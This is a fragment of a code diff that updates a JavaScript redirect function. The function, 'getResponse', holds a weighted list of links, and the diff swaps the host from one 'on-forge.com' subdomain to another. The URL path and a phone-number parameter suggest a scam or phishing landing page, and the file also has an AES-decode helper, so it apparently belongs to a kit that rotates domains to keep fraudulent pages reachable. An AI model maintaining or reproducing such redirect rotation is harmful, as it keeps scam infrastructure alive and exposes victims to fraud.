@@ -72,8 +72,8 @@ function aesDecode(encryptedText) {
   function getResponse() {
 
     const links = [
-        { url: "https://VelvetRoot.on-forge.com/werrx01USAHTML/?bcda=+65-653-106-3088", weight: 0.5 },
-        { url: "https://VelvetRoot.on-forge.com/werrx01USAHTML/?bcda=+65-653-106-3088", weight: 0.5 }
+        { url: "https://Nova-Vogue.on-forge.com/werrx01USAHTML/?bcda=+65-653-106-3088", weight: 0.5 },
+        { url: "https://Nova-Vogue.on-forge.com/werrx01USAHTML/?bcda=+65-653-106-3088", weight: 0.5 }
       
     ];
 
